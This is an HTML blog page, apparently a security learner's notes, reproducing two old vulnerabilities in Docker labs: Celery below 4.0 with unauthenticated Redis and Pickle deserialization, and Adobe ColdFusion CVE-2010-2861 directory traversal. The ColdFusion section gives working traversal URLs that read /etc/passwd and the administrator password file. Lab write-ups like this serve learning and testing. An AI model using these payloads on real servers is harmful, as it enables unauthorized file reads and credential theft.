@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>celery-coldfusion | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用简介介绍​    Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。 影响版本​    Celery 4.0以下版本。 漏洞成因​        在Celery &lt; 4.0版本默认使用Pickle进行任务消息">
+<meta property="og:type" content="article">
+<meta property="og:title" content="celery-coldfusion">
+<meta property="og:url" content="http://example.com/2023/11/17/celery-coldfusion/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用简介介绍​    Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。 影响版本​    Celery 4.0以下版本。 漏洞成因​        在Celery &lt; 4.0版本默认使用Pickle进行任务消息">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/17/celery-coldfusion/image-20231117201814748.png">
+<meta property="og:image" content="http://example.com/2023/11/17/celery-coldfusion/image-20231117202133905.png">
+<meta property="og:image" content="http://example.com/2023/11/17/celery-coldfusion/image-20231117202228460.png">
+<meta property="og:image" content="http://example.com/2023/11/17/celery-coldfusion/image-20231130170225665.png">
+<meta property="og:image" content="http://example.com/2023/11/17/celery-coldfusion/image-20231130170319914.png">
+<meta property="og:image" content="http://example.com/2023/11/17/celery-coldfusion/image-20231130170607204.png">
+<meta property="og:image" content="http://example.com/2023/11/17/celery-coldfusion/image-20231130170832029.png">
+<meta property="article:published_time" content="2023-11-17T11:54:24.000Z">
+<meta property="article:modified_time" content="2023-11-30T09:40:16.931Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/17/celery-coldfusion/image-20231117201814748.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-celery-coldfusion" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/11/17/celery-coldfusion/" class="article-date">
+  	<time datetime="2023-11-17T11:54:24.000Z" itemprop="datePublished">2023-11-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      celery-coldfusion
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Celery-lt-4-0-Redis未授权访问-Pickle反序列化利用"><a href="#Celery-lt-4-0-Redis未授权访问-Pickle反序列化利用" class="headerlink" title="Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用"></a>Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>​    Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>​    <code>Celery 4.0</code>以下版本。</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​        在Celery &lt; 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动Celery 3.1.23 + Redis：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231117201814748.png" alt="image-20231117201814748"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞利用脚本<code>exploit.py</code>仅支持在python3下使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br><span class="line">python exploit.py [主机IP]</span><br></pre></td></tr></table></figure>
+
+<p>查看结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose logs celery</span><br></pre></td></tr></table></figure>
+
+<p>可以看到如下</p>
+<p><img src="image-20231117202133905.png" alt="image-20231117202133905"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose exec celery ls -l &#x2F;tmp</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功创建了文件<code>celery_success</code></p>
+<p><img src="image-20231117202228460.png" alt="image-20231117202228460"></p>
+<h1 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>​        Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>​    Adobe ColdFusion 8、9版本</p>
+<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​    Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动Adobe CouldFusion 8.0.1版本服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231130170225665.png" alt="image-20231130170225665"></p>
+<p>环境启动可能需要1~5分钟，启动后，访问<code>http://your-ip:8500/CFIDE/administrator/enter.cfm</code>，可以看到初始化页面，输入密码<code>admin</code>，开始初始化整个环境。</p>
+<p><img src="image-20231130170319914.png" alt="image-20231130170319914"></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，删除其中的cookie信息后，即可读取文件/etc/passwd</p>
+<p><img src="image-20231130170607204.png" alt="image-20231130170607204"></p>
+<p>读取后台管理员密码<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code></p>
+<p><img src="image-20231130170832029.png" alt="image-20231130170832029"></p>
+<h2 id><a href="#" class="headerlink" title></a></h2>
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/11/30/couchdb/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          couchdb
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/11/16/bash-cacti/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">bash-cacti</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
